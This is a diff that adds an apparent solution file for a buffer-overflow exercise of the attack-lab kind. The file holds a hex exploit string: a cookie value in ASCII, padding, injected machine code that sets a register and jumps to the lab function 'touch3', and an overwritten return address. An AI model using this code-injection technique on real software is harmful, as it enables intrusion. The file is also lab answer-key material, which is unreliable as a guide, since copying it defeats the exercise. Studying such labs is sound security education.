@@ -1,0 +1,11 @@
+ /* cookie = 0x59b997fa */
+ /* 4018fa <touch3> */
+ /* %rbi = 0x5561dc78 */
+ /* stack was occupied at random() so empty */
+
+ 35 39 62 39 39 37 66 61
+ 00 00 00 00 00 00 00 00
+ bf 78 dc 61 55 48 83 ec 
+ 64 68 fa 18 40 00 c3 00
+ 00 00 00 00 00 00 00 00
+ 88 dc 61 55
